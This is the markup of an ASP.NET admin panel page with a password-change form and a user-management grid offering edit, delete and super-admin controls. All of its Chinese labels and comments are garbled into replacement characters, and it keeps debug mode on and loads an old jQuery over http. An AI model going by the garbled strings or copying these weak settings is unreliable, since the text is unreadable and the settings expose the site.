<%@ Page Language="C#" AutoEventWireup="true" CodeFile="adminweb.aspx.cs" Inherits="adminweb"  Debug="true"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<link rel="stylesheet" type="text/css" href="adminsty.css" />
<title>��̨����</title>
<script src="http://code.jquery.com/jquery-1.2.1.min.js" type="text/javascript"></script>
 <script type="text/javascript">
     $(function() {
         //ȫѡ 
         $("#btn1").click(function() {
             $("input[name$='CheckBox2']").attr("checked", "true");
         })
         //ȡ��ȫѡ 
         $("#btn2").click(function() {
             $("input[name$='CheckBox2']").removeAttr("checked");
         })
     });
    </script>
 <script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>   
<body>
<script language="JavaScript" type="text/javascript">
var lang = navigator.language || navigator.userLanguage;
if(lang.substr(0, 3) == "zh-"){
document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}</style>"); }
</script>
<form id="form1" runat="server">
  <table width="1038" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td colspan="9" align="left" valign="middle" bgcolor="#ff7d23" class="style1">��������</td>
    </tr>
  <tr>
    <td height="15" colspan="17" bgcolor="#585858"></td>
    </tr>
   <tr height="40">
    <td  align="center" valign="middle" bgcolor="#ff7d23"><a href="Default.aspx" class="ht" target="_blank">��վ��ҳ</a></td>
    <td   align="center" valign="middle" bgcolor="#ff7d23"><a href="show.aspx" class="ht" target="_blank">���չʾ</a></td>
    <td  align="center" valign="middle" bgcolor="#ff7d23"><a href="error.aspx" class="ht" target="_blank">��������</a></td>
    <td   align="center" valign="middle" bgcolor="#ff7d23"><a href="fix.aspx" class="ht" target="_blank">��������</a></td>
    <td  align="center" valign="middle" bgcolor="#ff7d23"><a href="bbs.aspx" class="ht" target="_blank">ҵ������</a></td>
    <td  align="center" valign="middle" bgcolor="#ff7d23"><a href="shop.aspx"  class="ht" target="_blank">�������</a></td>
   <td  align="center" valign="middle" bgcolor="#ff7d23"> <a href="staff.aspx" class="ht" target="_blank">�˲���Ƹ</a></td>
    <td  align="center" valign="middle" bgcolor="#ff7d23"><a href="messages.aspx" class="ht" target="_blank">��������</a></td>
    <td   align="center" valign="middle" bgcolor="#ff7d23"><a href="connect.aspx" class="ht" target="_blank">��ϵ����</a></td>
  </tr>  
  <tr>
  <td height="15" colspan="17" align="center" bgcolor="#FFFFFF">
        <p><br />
        </p>
       
        <table width="90%" border="0" cellspacing="0" cellpadding="12">
          <tr>
            <td style="width:200px" align="left"><h1>��̨����</h1>
             </td>
            <td align="right" nowrap="nowrap">
                <asp:Label ID="Label1" runat="server" Text=""></asp:Label></td>
            <td width="600px" align="right">
                &nbsp;<asp:ImageButton ID="btnUser" runat="server" ImageUrl="~/imgs/user.gif" 
                    Height="32" Width="32" title="�û�����" OnClick="btnUser_Click"/>
                &nbsp;<asp:ImageButton ID="btnGuest" runat="server" ImageUrl="~/imgs/guest.gif" 
                    Height="32" Width="32" title="�ÿ͹���" OnClick="btnGuest_Click"/>
                     &nbsp;<asp:ImageButton ID="btnSet" runat="server" ImageUrl="~/imgs/seting.gif" 
                    Height="32" Width="32" title="������" OnClick="btnSet_Click"/>
                     &nbsp;<asp:ImageButton ID="btnArt" runat="server" ImageUrl="~/imgs/artcle.gif" 
                    Height="32" Width="32" title="���¹���" OnClick="btnArt_Click"/>
                     &nbsp;<asp:ImageButton ID="btnAub" runat="server" ImageUrl="~/imgs/photo.gif" 
                    Height="32" Width="32" title="������" OnClick="btnAub_Click"/>
                     &nbsp;<asp:ImageButton ID="btnCont" runat="server" ImageUrl="~/imgs/content.gif" 
                    Height="32" Width="32" title="��Ϣ����" OnClick="btnCont_Click"/>
                &nbsp;<asp:ImageButton ID="btnChgpwd" runat="server" ImageUrl="~/imgs/chgpwd.gif" Height="32" Width="32" title="�޸�����" OnClick="btnChgpwd_click"/>
                &nbsp;<asp:ImageButton ID="btnSwtich" runat="server" ImageUrl="~/imgs/switch.gif" Height="32" Width="32" title="�л��û�" OnClick="btnSwitch_click"/>
                &nbsp;<asp:ImageButton ID="btnLogout" runat="server" ImageUrl="~/imgs/logout.gif" Height="32" Width="32" title="�ǳ�" OnClick="btnLogout_click"/></td>
          </tr>
          <tr>
            <td colspan="3" align="center" valign="middle">
            <!--֪ͨ-->
            <!--�޸�����-->                
                <br />
            <div id="divchgpwd" class="divcss" runat="server" align="center" visible="False">
              <table width="100%" border="0" cellspacing="0" cellpadding="12">
                <tr>
                  <td width="49%" align="right"><img src="imgs/chgpwd.gif" width="32" height="32" /></td>
                  <td width="25%" align="left"><strong>�����޸ģ�</strong></td>
                  <td width="26%" align="right"><asp:ImageButton ID="Cls" runat="server" ImageUrl="~/imgs/close.gif" title="�ر�" OnClick="Cls_click"/></td>
                </tr>
                <tr>
                  <td colspan="3"><p>ԭ���룺
                      <asp:TextBox ID="oldpwd" 
                          class="txt3" runat="server" BackColor="Silver" 
                          MaxLength="20" TextMode="Password"></asp:TextBox>
                  </p>
                  <p>�����룺<asp:TextBox ID="newpwd" class="txt3" 
                            runat="server" BackColor="Silver" 
                            TextMode="Password" MaxLength="20" ></asp:TextBox></p>
                  <p>������ȷ�ϣ�<asp:TextBox ID="newconf" class="txt3" runat="server" 
                            BackColor="Silver" MaxLength="20"  TextMode="Password" 
                            ></asp:TextBox></p>
                                            <div id="aptips"  runat="server" style="margin:auto 0; color:Red; font-weight:bolder;">
                            
                        </div>
                        
                        
                                          </td>
                </tr>
                <tr>
                  <td colspan="3"><asp:ImageButton ID="Chgpwd" runat="server" ImageUrl="~/imgs/okbtn.gif" OnClick="Chgpwd_click"/>
                      &nbsp;<asp:ImageButton ID="btnReset" runat="server" ImageUrl="~/imgs/clearbtn.gif" OnClick="btnReset_click"/></td>
                </tr>
              </table>
            </div>
</td>
          </tr>
          <tr>
            <td colspan="3" align="center" valign="middle">
            <!--�����û�-->
             <div id="divusers" class="divcss" runat="server" align="center" visible="False"><table width="100%" border="0" cellspacing="0" cellpadding="12">
                <tr>
                  <td width="49%" align="right"><img src="imgs/user.gif" width="32" height="32" /></td>
                  <td width="25%" align="left"><strong>�û�����</strong></td>
                  <td align="right">&nbsp;</td>
                  <td align="right"><asp:ImageButton ID="Cls2" runat="server" ImageUrl="~/imgs/close.gif" title="�ر�" OnClick="Cls2_click"/></td>
                </tr>
                <tr>
                  <td colspan="4" align="center">
                      <asp:GridView ID="gvuser" runat="server" AutoGenerateColumns="False" 
                                DataKeyNames="id" BackColor="LightGoldenrodYellow" BorderColor="Tan" 
                                BorderWidth="1px" CellPadding="2" ForeColor="Black" 
                            class="txt3" Height="84px" Width="700px" onrowdeleting="gvuser_RowDele" 
                          onrowediting="gvuser_RowEdt" onrowupdating="gvuser_RowUpd" HorizontalAlign="Center" EnableModelValidation="True" 
                          >
                            <Columns>
                                <asp:TemplateField>
                                    <ItemTemplate>
                                        <asp:CheckBox ID="CheckBox2" runat="server" />
                                    </ItemTemplate>
                                    <EditItemTemplate>
                                        <asp:CheckBox ID="CheckBox2" runat="server" />
                                    </EditItemTemplate>
                                    <ItemStyle HorizontalAlign="Center" />
                                </asp:TemplateField>
                                <asp:BoundField DataField="rowsid" HeaderText="���" ReadOnly="True">
                                <ItemStyle HorizontalAlign="Left" Width="6%" />
                                </asp:BoundField>
                                <asp:BoundField DataField="id" HeaderText="id" ReadOnly="true" Visible="False">
                                <ItemStyle HorizontalAlign="Left" />
                                </asp:BoundField>
                                <asp:TemplateField HeaderText="�û���">
                                    <ItemTemplate>
                                        <asp:Label ID="Label1" runat="server" Text='<%# Encryption.Decode(Eval("adname")) %>'></asp:Label>
                                    </ItemTemplate>
                                    <EditItemTemplate>
                                      <asp:Label ID="Label63" runat="server" Text='<%# Encryption.Decode(Eval("adname")) %>'></asp:Label>
                                    </EditItemTemplate>
                                    <ItemStyle HorizontalAlign="Left" />
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="����">
                                    <ItemTemplate>
                                        <asp:Label ID="Label3" runat="server" Text='<%# Encryption.Decode(Eval("admail")) %>'></asp:Label>
                                    </ItemTemplate>
                                    <EditItemTemplate>
                                        <asp:TextBox ID="txtcmail" runat="server" Text='<%# Encryption.Decode(Eval("admail")) %>'></asp:TextBox>
                                        <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" 
                                          ControlToValidate="txtcmail" CssClass="aptips" ErrorMessage="����" 
                                            Display="Dynamic"></asp:RequiredFieldValidator>
                                      <asp:RegularExpressionValidator ID="RegularExpressionValidator1" runat="server" 
                                          ControlToValidate="txtcmail" CssClass="aptips" ErrorMessage="�����ʽ����" 
                                          ValidationExpression="\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*" 
                                            Display="Dynamic"></asp:RegularExpressionValidator>
                                    </EditItemTemplate>
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="�����û�">
                                    <ItemTemplate>
                                        <asp:CheckBox ID="CheckBox1" runat="server" Checked='<%# Bind("suadmin") %>' />
                                    </ItemTemplate>
                                    <EditItemTemplate>
                                        <asp:CheckBox ID="CheckBox1" runat="server" Checked='<%# Bind("suadmin") %>' />
                                    </EditItemTemplate>
                                    <ItemStyle HorizontalAlign="Center" />
                                </asp:TemplateField>
                                <asp:TemplateField HeaderText="��֤��">
                                    <ItemTemplate>
                                        <asp:Label ID="Label2" runat="server" Text='<%# Eval("code") %>'></asp:Label>
                                    </ItemTemplate>
                                    <EditItemTemplate>
                                        <asp:Label ID="Label1" runat="server" Text='<%# Eval("code") %>'></asp:Label>
                                    </EditItemTemplate>
                                    <ItemStyle HorizontalAlign="Center" />
                                </asp:TemplateField>
                                <asp:CommandField ButtonType="Button" ShowEditButton="True" 
                                    ShowCancelButton="False" EditText="�޸�" UpdateText="����" >
                                    
                                    <ControlStyle BackColor="#FF7D23" BorderColor="#FF7D23" BorderStyle="Solid" 
                                        Font-Bold="True" Font-Names="����" Font-Size="Medium" ForeColor="White" />
                                <ItemStyle HorizontalAlign="Center" />
                                </asp:CommandField>
                                    
                                <asp:TemplateField ShowHeader="False">
                                    <ItemTemplate>
                                        <asp:Button ID="Button2" runat="server" CausesValidation="False" 
                                            CommandName="Delete" Text="ɾ��" 
                                            OnClientClick="javascript:return confirm('��ȷ��ɾ�����û���');" />
                                    </ItemTemplate>
                                    <ControlStyle BackColor="#FF7D23" BorderColor="#FF7D23" BorderStyle="Solid" 
                                        Font-Bold="True" Font-Names="����" Font-Size="Medium" ForeColor="White" />
                                    <ItemStyle HorizontalAlign="Center" />
                                </asp:TemplateField>
                                                               
                            </Columns>
                                <FooterStyle BackColor="Tan" />
                                <PagerStyle BackColor="PaleGoldenrod" ForeColor="DarkSlateBlue" 
                                    HorizontalAlign="Center" />
                                <SelectedRowStyle BackColor="DarkSlateBlue" ForeColor="GhostWhite" />
                                <HeaderStyle BackColor="Tan" Font-Bold="True" />
                                <AlternatingRowStyle BackColor="PaleGoldenrod" />
                      </asp:GridView>
                        
                        <br />
                      <div style="width:700px; text-align:left;"><input type="button" id="btn1" value="ȫѡ">&nbsp;&nbsp;<input type="button" id="btn2" value="ȡ��ȫѡ">&nbsp;&nbsp;<asp:Button 
                              ID="Button4" runat="server"  
                             
                              Text="ɾ��" onclick="deletemore" UseSubmitBehavior="False" />
                      </div><br /></td>
                </tr>
                <tr>
                  <td colspan="3">
                      <br />
                      <br />
                      <br />
                  <asp:Button ID="btnCeuser" runat="server" class="txt3" Text="�������û�" 
                    BackColor="#FF7D23" BorderStyle="Solid" Font-Bold="True" 
                    ForeColor="White" BorderColor="#FF7D23" OnClick="btnCeuser_Click" /></td>
                </tr>
              </table>
              </div>          
               
            </td>
          </tr>
        </table>

          <p>
              &nbsp;</p>
        <p>
            &nbsp;</p>
        <p>
            &nbsp;</p>
        <p>
            &nbsp;</p>
        <p>
            &nbsp;</p>
        <p>
            &nbsp;</p>
        <p>
            &nbsp;</p>
        <p>
            <br />
            <br />
            

        </p>
 <br />

            
  </tr>

  <tr>
    <td colspan="9" align="center" valign="middle" bgcolor="#FFFFFF">
        &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;</td>
  </tr>
  <tr>
    <td height="40" colspan="9" bgcolor="#A1A1A1"  class="footer"><p>&nbsp;</p>
      <p>&nbsp;&nbsp;<asp:Label ID="Label2" runat="server" Text=""></asp:Label></p></td></tr></table>          
    </form>
</body>
</html>
